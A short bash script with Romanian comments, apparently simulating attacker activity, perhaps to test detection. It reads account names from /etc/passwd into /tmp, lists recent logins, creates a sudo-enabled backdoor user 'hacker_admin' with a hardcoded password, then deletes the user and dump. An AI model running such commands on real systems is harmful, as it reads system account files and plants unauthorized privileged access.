#!/bin/bash

# 1. Reconnaissance (Enumerare agresivă)
echo "[*] Dumping user list..."
cat /etc/passwd | cut -d: -f1 > /tmp/users_dump.txt
grep "sh$" /etc/passwd  # Caută useri cu shell valid
last -n 50              # Verifică cine s-a logat recent
who -a

# 2. Persistence (Crearea unui user backdoor)
echo "[*] Creating backdoor user..."
# Verifică dacă userul există deja ca să nu dea eroare
if ! id "hacker_admin" &>/dev/null; then
    sudo useradd -m -s /bin/bash hacker_admin
    echo "hacker_admin:Pwned123!" | sudo chpasswd
    sudo usermod -aG sudo hacker_admin
    echo "[!] User created."
else
    echo "[!] User already exists, skipping."
fi

# 3. Cleanup simulation (încearcă să șteargă urma)
sudo userdel hacker_admin
rm /tmp/users_dump.txt
